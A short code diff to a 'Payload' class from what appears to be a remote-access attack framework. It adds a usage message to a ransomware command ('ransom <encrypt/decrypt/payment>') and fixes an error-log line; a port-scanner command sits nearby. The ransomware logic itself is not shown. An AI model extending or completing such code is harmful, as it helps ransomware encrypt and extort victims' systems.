@@ -957,6 +957,8 @@ class Payload():
         :param str target:      IPv4 address
 
         """
+        if target is None:
+            return "ransom <encrypt/decrypt/payment>"
         res = "Success!"
         try:
             if 'ransom' not in globals():
@@ -968,7 +970,7 @@ class Payload():
             return res
 
         except Exception as e:
-            log("{} error: {}".format(self.portscanner.__name__, str(e)))
+            log("{} error: {}".format(self.ransom.__name__, str(e)))
             return traceback.format_exc()
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='portscanner <target>')
